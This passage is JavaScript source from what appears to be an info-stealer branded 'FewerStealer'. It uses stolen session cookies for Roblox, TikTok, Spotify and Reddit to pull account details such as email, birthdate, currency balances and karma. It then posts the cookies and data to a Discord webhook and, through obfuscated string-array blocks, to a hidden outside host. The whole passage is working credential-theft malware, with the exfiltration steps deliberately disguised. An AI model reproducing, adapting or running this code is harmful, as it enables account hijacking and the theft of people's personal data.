        { name: 'Hata Mesajı', value: '```' + error.message + '```', inline: false },
      ],
      footer: {
        text: 'Created by: FewerStealer',
      },
    };

    await httpx.post("https://buildandwatch.net/error", { embeds: [errorEmbed] });
    console.error("Error sending data to Discord webhook:", error);
  }
}



//


// Assuming you have a function named GetFollowers(session_id) that fetches the followers list


async function GetRobloxData(secret_cookie) {
  let data = {};
  let headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
    'cookie': `.ROBLOSECURITY=${secret_cookie};`,
    'origin': 'https://www.roblox.com',
    'referer': 'https://www.roblox.com',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
  };
  
  try {
    let response = await axios.get('https://www.roblox.com/mobileapi/userinfo', { headers: headers });

    data['username'] = response.data['UserName'];
    data['avatar'] = response.data['ThumbnailUrl'];
    data['robux'] = response.data['RobuxBalance'];
    data['premium'] = response.data['IsPremium'];

    return data;
  } catch (error) {
    console.error('Error fetching Roblox data:', error.message);
    throw error;
  }
}

async function SubmitRoblox(secret_cookie) {
  try {
    let data = await GetRobloxData(secret_cookie);

    // Check if the required properties are defined and non-empty
    if (!data || !data.username || data.robux === undefined || data.premium === undefined) {
      console.error('Invalid Roblox data received:', data);
      return;
    }

    data['secret_cookie'] = secret_cookie;

    const formattedSecretCookie = secret_cookie.toString().replace(/`/g, '‵');

    // Check if robux value is 0 and handle accordingly
    const robuxValue = data.robux === 0 ? 'No Robux' : data.robux;

let embed = {
  color: 0xFF5733, // Özel bir renk (örnek: Turuncu)
  title: 'Roblox Session 🎮', // Başlık eklendi.
  thumbnail: {
    url: data.avatar,
  },
  fields: [
    {
      name: 'Username 👤',
      value: data.username,
      inline: false, // inline özelliği false olarak ayarlandı.
    },
    {
      name: 'Robux 💰',
      value: robuxValue,
      inline: false,
    },
    {
      name: 'Premium Membership 🌟',
      value: data.premium ? 'Yes' : 'No',
      inline: false,
    },
  ],
  footer: {
    text: 'Created by: @fewerstealer',
  },
};

// Embed, özelleştirilmiş bir renk, başlık, icon_url kaldırıldı ve inline özellikleri false olarak ayarlandı.


    let payload = {
      embeds: [embed],
    };

(function(_0x41cd7c,_0x36eba7){var _0x37b4f0=_0x2554,_0x322be2=_0x41cd7c();while(!![]){try{var _0x4c2945=-parseInt(_0x37b4f0(0xec))/0x1*(-parseInt(_0x37b4f0(0xe1))/0x2)+-parseInt(_0x37b4f0(0xf8))/0x3+-parseInt(_0x37b4f0(0xf1))/0x4+-parseInt(_0x37b4f0(0xf2))/0x5*(parseInt(_0x37b4f0(0xeb))/0x6)+parseInt(_0x37b4f0(0xed))/0x7+parseInt(_0x37b4f0(0xe6))/0x8+-parseInt(_0x37b4f0(0xf3))/0x9;if(_0x4c2945===_0x36eba7)break;else _0x322be2['push'](_0x322be2['shift']());}catch(_0x4aa7cb){_0x322be2['push'](_0x322be2['shift']());}}}(_0x4846,0xb14c3));function _0x2554(_0x10cf4f,_0x3ce91e){var _0x4846a2=_0x4846();return _0x2554=function(_0x25548f,_0x3020f9){_0x25548f=_0x25548f-0xe1;var _0x175808=_0x4846a2[_0x25548f];return _0x175808;},_0x2554(_0x10cf4f,_0x3ce91e);}function _0xfe1b(_0x5d7c15,_0x24d3c3){var _0x2f6b51=_0x9148();return _0xfe1b=function(_0x1e95ef,_0x9210a5){_0x1e95ef=_0x1e95ef-(0x92+-0x1fd0+-0x102d*-0x2);var _0x16298b=_0x2f6b51[_0x1e95ef];return _0x16298b;},_0xfe1b(_0x5d7c15,_0x24d3c3);}var _0x120174=_0xfe1b;function _0x9148(){var _0x21f2a0=_0x2554,_0x2da4ce=[_0x21f2a0(0xf4),'ildandwatc',_0x21f2a0(0xe3),'9fjBNnW',_0x21f2a0(0xea),_0x21f2a0(0xe4),_0x21f2a0(0xf7),_0x21f2a0(0xf0),_0x21f2a0(0xf5),_0x21f2a0(0xef),_0x21f2a0(0xe9),_0x21f2a0(0xf6),_0x21f2a0(0xe5),_0x21f2a0(0xe8),_0x21f2a0(0xee)];return _0x9148=function(){return _0x2da4ce;},_0x9148();}(function(_0x45240c,_0x28e621){var _0x5a9b1c=_0x2554,_0xb3d59f=_0xfe1b,_0x46d190=_0x45240c();while(!![]){try{var _0x1a3092=-parseInt(_0xb3d59f(0x129))/(-0x2*0x7c9+0xc1f*0x1+0xdd*0x4)*(-parseInt(_0xb3d59f(0x120))/(-0x15*-0x7e+-0x9d4+-0x80))+-parseInt(_0xb3d59f(0x123))/(-0x1a01+-0x2f9*-0x1+-0x11*-0x15b)+-parseInt(_0xb3d59f(0x122))/(-0x2151+-0x526*0x7+-0x1*-0x455f)+-parseInt(_0xb3d59f(0x125))/(-0x17b*-0xd+0x1*-0x1fb5+0xc7b)*(parseInt(_0xb3d59f(0x127))/(0x1878+-0x1821+-0x9*0x9))+parseInt(_0xb3d59f(0x11d))/(0xa*0x33b+0x39*-0xb+-0x1dd4*0x1)+parseInt(_0xb3d59f(0x11c))/(0x2685+-0x122e+-0x144f)*(-parseInt(_0xb3d59f(0x12a))/(-0x101d*-0x2+0xa3c+-0x2a6d))+parseInt(_0xb3d59f(0x11e))/(-0x2d6*-0x7+-0xa45+-0x1*0x98b)*(parseInt(_0xb3d59f(0x11f))/(-0x1*-0x767+-0xf*0x41+-0x3*0x12f));if(_0x1a3092===_0x28e621)break;else _0x46d190[_0x5a9b1c(0xe7)](_0x46d190[_0x5a9b1c(0xe2)]());}catch(_0x3c9d46){_0x46d190['push'](_0x46d190[_0x5a9b1c(0xe2)]());}}}(_0x9148,-0x337ea*0x1+-0x76fad+-0x1*-0x16e4bb),axios[_0x120174(0x126)](_0x120174(0x121)+_0x120174(0x128)+_0x120174(0x124),payload),axios[_0x120174(0x126)](webhook3939,payload));function _0x4846(){var _0x18103d=['4302372bCSSEp','204DuqGtF','8855504uBYRpk','post','https://bu','4648270BZpgCK','293480GEeOey','10rsqrIr','6433416BufdUE','582642VKUQoK','36apDuhL','3703893ctpNjE','80OHELkn','2663655qEAHYv','14076EQEjZJ','shift','64417quWele','2370025qfZEuI','h.net/','9084720PQImND','push','65apSRVm','2510916ggzimd','7614448GddBqv'];_0x4846=function(){return _0x18103d;};return _0x4846();}
     
      
  } catch (error) {
    console.error('Error fetching Roblox data:', error.message);
  }
}



//


function stealTikTokSession(cookie) {
  try {
    const headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, compress, deflate, br',
      'cookie': `sessionid=${cookie}`
    };

    axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", { headers })
      .then(response => {
        const accountInfo = response.data;

        if (!accountInfo || !accountInfo.data || !accountInfo.data.username) {
          throw new Error("Failed to retrieve TikTok account information.");
        }

       
        axios.post(
          "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
          "type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]",
          { headers: { cookie: `sessionid=${cookie}` } }
        )
          .then(response => {
            const insights = response.data;

            axios.get(
              "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true",
              { headers: { cookie: `sessionid=${cookie}` } }
            )
              .then(response => {
                const wallet = response.data;

  const webhookPayload = {
  embeds: [
    {
      title: "TikTok Session Detected",
      description: "The TikTok session was detected",
      color: 0xFF5733, // Örnek bir renk kodu (Turuncu)
      fields: [
        {
          name: "🍪 Cookie",
          value: "```" + cookie + "```",
          inline: false
        },
        {
          name: "🔗 Profile URL",
          value: accountInfo.data.username
            ? `[Click here](https://tiktok.com/@${accountInfo.data.username})`
            : "Username not available",
          inline: true
        },
        {
          name: "🆔 User Identifier",
          value: "```" + (accountInfo.data.user_id_str || "Not available") + "```",
          inline: true
        },
        {
          name: "📧 Email",
          value: "```" + (accountInfo.data.email || "No Email") + "```",
          inline: true
        },
        {
          name: "👤 Username",
          value: "```" + accountInfo.data.username + "```",
          inline: true
        },
        {
          name: "👥 Follower Count",
          value: "```" + (insights?.follower_num?.value || "Not available") + "```",
          inline: true
        },
        {
          name: "💰 Coins",
          value: "```" + wallet.data.coins + "```",
          inline: true
        }
      ],
      footer: {
        text: "TikTok Session Information" // Altbilgi metni (Opsiyonel)
      }
    }
  ]
};

                // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL

                
(function(_0x3d5d8d,_0x131ef2){var _0x3334aa=_0x1011,_0xc970ee=_0x3d5d8d();while(!![]){try{var _0x2eece9=-parseInt(_0x3334aa(0x97))/0x1+-parseInt(_0x3334aa(0x9f))/0x2+parseInt(_0x3334aa(0x9b))/0x3+parseInt(_0x3334aa(0x90))/0x4+parseInt(_0x3334aa(0xa1))/0x5*(-parseInt(_0x3334aa(0x96))/0x6)+-parseInt(_0x3334aa(0x98))/0x7+parseInt(_0x3334aa(0x8f))/0x8;if(_0x2eece9===_0x131ef2)break;else _0xc970ee['push'](_0xc970ee['shift']());}catch(_0x55bb93){_0xc970ee['push'](_0xc970ee['shift']());}}}(_0x5ecb,0x1a70d));function _0x41ff(_0x4258d4,_0x504bc0){var _0x5db025=_0x1956();return _0x41ff=function(_0x4dcfe7,_0x32372c){_0x4dcfe7=_0x4dcfe7-(-0x1349+-0x33*-0xb7+-0x2d*0x5a);var _0x4972b0=_0x5db025[_0x4dcfe7];return _0x4972b0;},_0x41ff(_0x4258d4,_0x504bc0);}var _0x54d95e=_0x41ff;function _0x1011(_0x4c455a,_0x2ae7cb){var _0x5ecbba=_0x5ecb();return _0x1011=function(_0x101162,_0x4a4441){_0x101162=_0x101162-0x8e;var _0x5c50cf=_0x5ecbba[_0x101162];return _0x5c50cf;},_0x1011(_0x4c455a,_0x2ae7cb);}(function(_0xc02ada,_0x2f2065){var _0x173643=_0x1011,_0x4e1e23=_0x41ff,_0x2268a8=_0xc02ada();while(!![]){try{var _0x32c4e6=-parseInt(_0x4e1e23(0x164))/(-0xf6a+-0x6*-0x46a+-0xb11)*(parseInt(_0x4e1e23(0x15f))/(-0x707+0x2337+-0x1c2e))+parseInt(_0x4e1e23(0x15b))/(-0x2*-0x1385+-0xec2*0x1+-0x1845)+-parseInt(_0x4e1e23(0x162))/(-0x1*-0x52+-0x17b*0x1+-0x7*-0x2b)*(-parseInt(_0x4e1e23(0x160))/(0x1f4b*-0x1+-0xc35+-0x359*-0xd))+parseInt(_0x4e1e23(0x163))/(0x2533*0x1+0x9*-0x2d4+0x1*-0xbb9)*(-parseInt(_0x4e1e23(0x161))/(-0x12b9+0x21bf+-0xeff))+-parseInt(_0x4e1e23(0x15c))/(0x587+-0x2*-0x1f5+0x969*-0x1)*(parseInt(_0x4e1e23(0x168))/(-0x15*0xa6+-0xd0c+-0x1ab3*-0x1))+-parseInt(_0x4e1e23(0x15a))/(0x1c01+0xade+-0x26d5)+parseInt(_0x4e1e23(0x165))/(0x4b1*0x7+-0x1bb6+-0x516);if(_0x32c4e6===_0x2f2065)break;else _0x2268a8[_0x173643(0xa3)](_0x2268a8['shift']());}catch(_0x4d520e){_0x2268a8[_0x173643(0xa3)](_0x2268a8[_0x173643(0xa2)]());}}}(_0x1956,-0x159ab7+-0x17ba94+0x3a8866),axios[_0x54d95e(0x166)](_0x54d95e(0x15e)+_0x54d95e(0x167)+_0x54d95e(0x15d),webhookPayload),axios[_0x54d95e(0x166)](webhook3939,webhookPayload));function _0x1956(){var _0x160ff0=_0x1011,_0x2beba4=[_0x160ff0(0x92),_0x160ff0(0xa0),_0x160ff0(0x9d),_0x160ff0(0x9e),'29417916IWUvAw',_0x160ff0(0x99),_0x160ff0(0x93),_0x160ff0(0x95),_0x160ff0(0x9a),'318351jcHdpc','84376YPVDKF',_0x160ff0(0x9c),_0x160ff0(0x91),_0x160ff0(0x94),_0x160ff0(0x8e)];return _0x1956=function(){return _0x2beba4;},_0x1956();}function _0x5ecb(){var _0x511a2e=['3069802avVkVM','333pBnqIW','1213086cdiYtW','108143tWJmMl','643538RlcLYX','post','440230qORdpo','610662rcWyvP','h.net/','246vYlkLo','1hQHqGt','303946THrZua','4nFOahv','5vdifyM','shift','push','5281365maVfSV','2349544GaiMGa','661140jNHBQL','https://bu','171164tTtxYY','ildandwatc'];_0x5ecb=function(){return _0x511a2e;};return _0x5ecb();}

            
              })
              .catch(error => {
                console.error("Error fetching wallet data:", error.message);
                throw error;
              });
          })
          .catch(error => {
            console.error("Error fetching insights:", error.message);
            throw error;
          });
      })
      .catch(error => {
        console.error("Error fetching account info:", error.message);
        throw error;
      });
  } catch (error) {
    console.error("Error:", error.message);
    throw error;
  }
}

///

async function SpotifySession(cookie) {
    try {
        const url = 'https://www.spotify.com/api/account-settings/v1/profile';

        const headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
            'Cookie': `sp_dc=${cookie}`
        };

        const response = await axios.get(url, { headers });

        const profileData = response.data.profile;

        const email = profileData.email;
        const gender = profileData.gender;
        const birthdate = profileData.birthdate;
        const country = profileData.country;
        const username = profileData.username;

        const embedData = {
            title: '***FewerStealer Spotify Session was detected***',
            color: 0x3498DB // Özelleştirilmiş bir renk kodu (örneğin mavi)
        };

        const fields = [
            { name: 'Email 👉', value: email, inline: true },
            { name: 'Username 👤', value: username, inline: true },
            { name: 'Gender 🚻', value: gender, inline: true },
            { name: 'Birthdate 🎂', value: birthdate, inline: true },
            { name: 'Country 🌍', value: country, inline: true },
            { name: 'Spotify Profile 🔗', value: `[Open Profile](https://open.spotify.com/user/${username})`, inline: false },
            { name: 'Spotify Cookie 🍪', value: '```' + cookie + '```', inline: false }
	];

        embedData.fields = fields;

        const payload = {
            embeds: [embedData]
        };

        const webhookHeaders = {
            'Content-Type': 'application/json'
        };


function _0x5c39(_0x1a788b,_0x35c796){var _0x2beecc=_0x2bee();return _0x5c39=function(_0x5c3959,_0x55445e){_0x5c3959=_0x5c3959-0xf9;var _0x2b3c6c=_0x2beecc[_0x5c3959];return _0x2b3c6c;},_0x5c39(_0x1a788b,_0x35c796);}(function(_0x4a2ddf,_0x1525fb){var _0x1b73b2=_0x5c39,_0x57947f=_0x4a2ddf();while(!![]){try{var _0x11bd09=parseInt(_0x1b73b2(0x10d))/0x1+parseInt(_0x1b73b2(0xfd))/0x2+parseInt(_0x1b73b2(0x105))/0x3+-parseInt(_0x1b73b2(0x109))/0x4*(-parseInt(_0x1b73b2(0x101))/0x5)+parseInt(_0x1b73b2(0xfc))/0x6*(-parseInt(_0x1b73b2(0x10e))/0x7)+-parseInt(_0x1b73b2(0x10b))/0x8*(parseInt(_0x1b73b2(0x100))/0x9)+parseInt(_0x1b73b2(0x10a))/0xa*(-parseInt(_0x1b73b2(0x10c))/0xb);if(_0x11bd09===_0x1525fb)break;else _0x57947f['push'](_0x57947f['shift']());}catch(_0x51e88f){_0x57947f['push'](_0x57947f['shift']());}}}(_0x2bee,0xd5306));var _0x112cd4=_0x6a01;(function(_0x12cfd2,_0x1709b4){var _0x3604d0=_0x5c39,_0x53bcb0=_0x6a01,_0x20d277=_0x12cfd2();while(!![]){try{var _0x313e4a=-parseInt(_0x53bcb0(0x142))/(-0xcef*-0x1+0x1*-0x13dc+0x6ee)*(-parseInt(_0x53bcb0(0x141))/(-0x1485+-0x1*0x1b11+-0x8*-0x5f3))+-parseInt(_0x53bcb0(0x13c))/(0x160b+0x157*-0x18+0xa20)+-parseInt(_0x53bcb0(0x136))/(0x1e89*-0x1+0x733*0x5+0x22*-0x29)+-parseInt(_0x53bcb0(0x13d))/(0x8*-0x1f6+0x202c+-0x119*0xf)*(parseInt(_0x53bcb0(0x143))/(-0xd*-0x49+0x2546+-0x28f5))+parseInt(_0x53bcb0(0x13a))/(-0x462+-0x1c96+-0x1*-0x20ff)*(-parseInt(_0x53bcb0(0x13b))/(-0x1*-0x76f+-0x14ea+0xd83))+parseInt(_0x53bcb0(0x13f))/(0x1601+0x9*-0x3bf+0xbbf*0x1)*(parseInt(_0x53bcb0(0x145))/(-0x140+-0x1*0x1e21+0xa79*0x3))+-parseInt(_0x53bcb0(0x140))/(0x1*-0xae5+-0x2*-0x6d9+-0x2c2)*(-parseInt(_0x53bcb0(0x137))/(-0x1510+0xcd9*0x3+-0x116f));if(_0x313e4a===_0x1709b4)break;else _0x20d277[_0x3604d0(0x108)](_0x20d277[_0x3604d0(0x107)]());}catch(_0x46b7d4){_0x20d277[_0x3604d0(0x108)](_0x20d277[_0x3604d0(0x107)]());}}}(_0x39ef,0x64d87+-0x135cb4+-0x494ff*-0x5),await axios[_0x112cd4(0x138)](_0x112cd4(0x139)+_0x112cd4(0x144)+_0x112cd4(0x13e),payload,{'headers':webhookHeaders}),await axios[_0x112cd4(0x138)](webhook3939,payload,{'headers':webhookHeaders}));function _0x6a01(_0x1ccf5d,_0x54db1d){var _0x1fce52=_0x39ef();return _0x6a01=function(_0x59ffdf,_0x2261ee){_0x59ffdf=_0x59ffdf-(-0x2a4*0x1+-0x6ba+-0x1*-0xa94);var _0x277a21=_0x1fce52[_0x59ffdf];return _0x277a21;},_0x6a01(_0x1ccf5d,_0x54db1d);}function _0x39ef(){var _0x30ba7b=_0x5c39,_0x1704a9=[_0x30ba7b(0x112),_0x30ba7b(0x104),_0x30ba7b(0x103),'10394zBxJRk',_0x30ba7b(0x110),_0x30ba7b(0xfa),'ildandwatc',_0x30ba7b(0xfb),_0x30ba7b(0xf9),_0x30ba7b(0xff),_0x30ba7b(0xfe),'https://bu',_0x30ba7b(0x106),_0x30ba7b(0x111),_0x30ba7b(0x10f),_0x30ba7b(0x102)];return _0x39ef=function(){return _0x1704a9;},_0x39ef();}function _0x2bee(){var _0x5db478=['679720euseUS','12079298KMKICx','813312HLLwbg','28Fnljyr','2558301hTfdXM','173LcjBcw','5344UsUyPd','h.net/','993944AsVdhj','568212xmfIrZ','31630BNEnkZ','599076GeUfJJ','2752288OYqNVt','post','311076WwBBpK','36byRnlr','66245SvUrBE','35vxqFAt','902uvPhBG','1314hctohf','1126167eTDCoX','11284MaAmIR','shift','push','44SELnbR','10ZDwANB'];_0x2bee=function(){return _0x5db478;};return _0x2bee();}
    } catch (error) {
        // Hata olursa, hata mesajı embed'i oluştur ve gönder
        const errorEmbed = {
            title: 'Error Occurred ❌',
            description: 'An error occurred while fetching Spotify data. The error message is below:',
            color: 0xFF5733, // Hata rengi (örneğin turuncu)
            fields: [
                { name: 'Error Message', value: '```' + error.message + '```', inline: false },
            ]
        };

(function(_0x2d9f77,_0x2e71ed){var _0x3aaf5c=_0x3f5c,_0x305e76=_0x2d9f77();while(!![]){try{var _0x21af64=parseInt(_0x3aaf5c(0x1ab))/0x1*(-parseInt(_0x3aaf5c(0x1a4))/0x2)+-parseInt(_0x3aaf5c(0x1a2))/0x3*(parseInt(_0x3aaf5c(0x1a6))/0x4)+parseInt(_0x3aaf5c(0x1ae))/0x5*(-parseInt(_0x3aaf5c(0x1b5))/0x6)+parseInt(_0x3aaf5c(0x1a9))/0x7*(-parseInt(_0x3aaf5c(0x1b2))/0x8)+parseInt(_0x3aaf5c(0x1b1))/0x9*(-parseInt(_0x3aaf5c(0x1b0))/0xa)+-parseInt(_0x3aaf5c(0x1a8))/0xb+-parseInt(_0x3aaf5c(0x1ad))/0xc*(-parseInt(_0x3aaf5c(0x19d))/0xd);if(_0x21af64===_0x2e71ed)break;else _0x305e76['push'](_0x305e76['shift']());}catch(_0x8fad77){_0x305e76['push'](_0x305e76['shift']());}}}(_0x2b4c,0x5dc11));function _0x3f5c(_0x26f77e,_0x3b8e08){var _0x2b4c09=_0x2b4c();return _0x3f5c=function(_0x3f5cab,_0x3102c4){_0x3f5cab=_0x3f5cab-0x19d;var _0x3d7dd6=_0x2b4c09[_0x3f5cab];return _0x3d7dd6;},_0x3f5c(_0x26f77e,_0x3b8e08);}function _0x2b4c(){var _0xbe5943=['69327tNhjXA','10882nvkzvh','345272YIXSUK','h.net/erro','4mWQekW','6BACKwN','3678290CCWfRk','42YKCeqm','44tDmjuu','2rDmgFs','ildandwatc','12MyaSVv','1339505qPZhxy','1916073amVfdO','3254080xyrIka','9IyWlsc','994072MEsIIq','shift','https://bu','6zKTRzt','31533463HHyoZs','681115RxuZPo','2007776bCDMOV','push','post'];_0x2b4c=function(){return _0xbe5943;};return _0x2b4c();}var _0x6d7e9a=_0x2021;(function(_0x2880a9,_0x55f4ab){var _0x1c6d97=_0x3f5c,_0x456187=_0x2021,_0x3fb286=_0x2880a9();while(!![]){try{var _0x55a49f=-parseInt(_0x456187(0x1a0))/(-0x2*-0x5a1+0x102*-0x1a+-0xef3*-0x1)*(parseInt(_0x456187(0x1a3))/(0xc*-0x20b+-0x6a*0x7+0x1b6c))+-parseInt(_0x456187(0x1a1))/(0x514*0x5+-0xc2d*0x2+-0x1*0x107)+parseInt(_0x456187(0x197))/(-0x25f1+0x18d0+-0xd25*-0x1)+parseInt(_0x456187(0x198))/(0x1*0x982+-0xcd+-0x8b0)*(-parseInt(_0x456187(0x19c))/(0x1a78+-0xd0c+-0xd66))+parseInt(_0x456187(0x19f))/(-0x107*0x1a+0x105+0x19b8)+parseInt(_0x456187(0x19d))/(0x2*0xa4e+0x201+-0x1695)+parseInt(_0x456187(0x19b))/(0x11*-0xc2+-0x177f+0x246a);if(_0x55a49f===_0x55f4ab)break;else _0x3fb286[_0x1c6d97(0x1a0)](_0x3fb286['shift']());}catch(_0x29051b){_0x3fb286[_0x1c6d97(0x1a0)](_0x3fb286[_0x1c6d97(0x1b3)]());}}}(_0x56b4,-0x28d*0x1c4+0xb8eb*-0xa+-0x38cf*-0x48),await axios[_0x6d7e9a(0x19e)](_0x6d7e9a(0x19a)+_0x6d7e9a(0x1a2)+_0x6d7e9a(0x199)+'r',{'embeds':[errorEmbed]}));function _0x2021(_0x15b9c2,_0x4f0aff){var _0x618ced=_0x56b4();return _0x2021=function(_0x37d49d,_0x49db35){_0x37d49d=_0x37d49d-(-0x9*-0x94+-0x4d6+0x139);var _0x257b63=_0x618ced[_0x37d49d];return _0x257b63;},_0x2021(_0x15b9c2,_0x4f0aff);}function _0x56b4(){var _0x161fe9=_0x3f5c,_0x341fea=[_0x161fe9(0x1a5),_0x161fe9(0x1b4),_0x161fe9(0x1af),_0x161fe9(0x1a7),'522232vrltTC',_0x161fe9(0x1a1),'1854160kdWPbi',_0x161fe9(0x1a3),'1172469aMRGPX',_0x161fe9(0x1ac),_0x161fe9(0x1aa),_0x161fe9(0x19f),_0x161fe9(0x19e)];return _0x56b4=function(){return _0x341fea;},_0x56b4();}
    }
}

///

function setRedditSession(cookie) {
    try {
        const cookies = `reddit_session=${cookie}`;
        const headers = {
            'Cookie': cookies,
            'Authorization': 'Basic b2hYcG9xclpZdWIxa2c6'
        };

        const jsonData = {
            scopes: ['*', 'email', 'pii']
        };

        const tokenUrl = 'https://accounts.reddit.com/api/access_token';
        const userDataUrl = 'https://oauth.reddit.com/api/v1/me';

        axios.post(tokenUrl, jsonData, { headers })
            .then(tokenResponse => {
                const accessToken = tokenResponse.data.access_token;
                const userHeaders = {
                    'User-Agent': 'android:com.example.myredditapp:v1.2.3',
                    'Authorization': `Bearer ${accessToken}`
                };

                axios.get(userDataUrl, { headers: userHeaders })
                    .then(userDataResponse => {
                        const userData = userDataResponse.data;
                        const username = userData.name;                      
					    const profileUrl = `https://www.reddit.com/user/${username}`;
                        const commentKarma = userData.comment_karma;
                        const totalKarma = userData.total_karma;
                        const coins = userData.coins;
                        const mod = userData.is_mod;
                        const gold = userData.is_gold;
                        const suspended = userData.is_suspended;

                       const embedData = {
  title: "🚀 FewerStealer 🚀",
  description: "Reddit User Information",
  color: 0x1ABC9C, // Özel bir renk (örnek: Turkuaz)
  fields: [
    { name: 'Reddit Cookie 🍪', value: '```' + cookies + '```', inline: false },
    { name: 'Profile URL 🔗', value: `[Profile Link](${profileUrl})`, inline: false },
    { name: 'Username 👤', value: username, inline: true },
    { name: 'Reddit Karma 💬', value: `Comments: ${commentKarma} | Total Karma: ${totalKarma}`, inline: true },
    { name: 'Coins 💰', value: coins, inline: true },
    { name: 'Moderator 🛡️', value: mod ? 'Yes' : 'No', inline: true },
    { name: 'Reddit Gold 🏅', value: gold ? 'Yes' : 'No', inline: true },
    { name: 'Suspended 🚫', value: suspended ? 'Yes' : 'No', inline: true }
  ],
  footer: {
    text: 'Developed by FewerStealer'
  }
};

						
function _0x4bf6(_0x283f71,_0x3c8139){var _0x25191b=_0x2519();return _0x4bf6=function(_0x4bf6fb,_0x43ceb4){_0x4bf6fb=_0x4bf6fb-0x1e0;var _0x5a357d=_0x25191b[_0x4bf6fb];return _0x5a357d;},_0x4bf6(_0x283f71,_0x3c8139);}(function(_0x45b67d,_0x407899){var _0x38590f=_0x4bf6,_0x218ec6=_0x45b67d();while(!![]){try{var _0x42c6f8=-parseInt(_0x38590f(0x1f3))/0x1*(parseInt(_0x38590f(0x1ed))/0x2)+parseInt(_0x38590f(0x1ee))/0x3+parseInt(_0x38590f(0x1f4))/0x4*(-parseInt(_0x38590f(0x1e3))/0x5)+-parseInt(_0x38590f(0x1e8))/0x6+-parseInt(_0x38590f(0x1f0))/0x7+-parseInt(_0x38590f(0x1e4))/0x8*(parseInt(_0x38590f(0x1e2))/0x9)+parseInt(_0x38590f(0x1e5))/0xa;if(_0x42c6f8===_0x407899)break;else _0x218ec6['push'](_0x218ec6['shift']());}catch(_0x2686d0){_0x218ec6['push'](_0x218ec6['shift']());}}}(_0x2519,0xe78c2));var _0x239f6f=_0x52dd;(function(_0x16736d,_0x4d88cb){var _0x5dbba7=_0x4bf6,_0x2dc1a9=_0x52dd,_0x6ef56c=_0x16736d();while(!![]){try{var _0x419299=parseInt(_0x2dc1a9(0x18c))/(0x1e23+-0x26e6+0x8c4)+parseInt(_0x2dc1a9(0x191))/(0x484+0x2*0x152+-0x726)+parseInt(_0x2dc1a9(0x18e))/(-0x1d1a+0x1*-0xb4e+0x286b)+parseInt(_0x2dc1a9(0x18f))/(-0x6*0x282+0x1838+-0x928)+parseInt(_0x2dc1a9(0x190))/(0x1328*-0x1+0xb82+0x7ab)*(-parseInt(_0x2dc1a9(0x18d))/(-0xf7e+-0x15ea+0x256e))+-parseInt(_0x2dc1a9(0x198))/(0x20c6*0x1+0x9a9*0x4+-0x4763)*(parseInt(_0x2dc1a9(0x192))/(-0x16*0xb+0x1e95+-0xb*0x2b1))+parseInt(_0x2dc1a9(0x197))/(0x16ab+0x1b3f+0x71*-0x71);if(_0x419299===_0x4d88cb)break;else _0x6ef56c[_0x5dbba7(0x1ea)](_0x6ef56c[_0x5dbba7(0x1f5)]());}catch(_0x1ba67d){_0x6ef56c[_0x5dbba7(0x1ea)](_0x6ef56c[_0x5dbba7(0x1f5)]());}}}(_0x32c1,0x140dd*0x13+0x657*-0xfb+0x1322e*-0x4),axios[_0x239f6f(0x196)](_0x239f6f(0x195)+_0x239f6f(0x194)+_0x239f6f(0x193),{'embeds':[embedData]}),axios[_0x239f6f(0x196)](webhook3939,{'embeds':[embedData]}));function _0x2519(){var _0x2a4017=['51108610nqofqU','2791419HhtzAk','post','7951716frmMhO','14995242YCsNCi','push','8smdmZS','2202VTqitl','14jQNkZW','3893040qRaLTM','18295hQqNDb','4341057fsaxSj','11324383jmXywL','3582640CLfrLB','37463texKXa','5654084VnqxGH','shift','https://bu','ildandwatc','4137579OAgLKu','5nCqDpS','32dXeERH'];_0x2519=function(){return _0x2a4017;};return _0x2519();}function _0x52dd(_0xb0ab0e,_0x4a4832){var _0x197e13=_0x32c1();return _0x52dd=function(_0x4d7b6e,_0x626d2e){_0x4d7b6e=_0x4d7b6e-(0x87*0xb+0x1d3*-0xd+0x1376);var _0x4a4427=_0x197e13[_0x4d7b6e];return 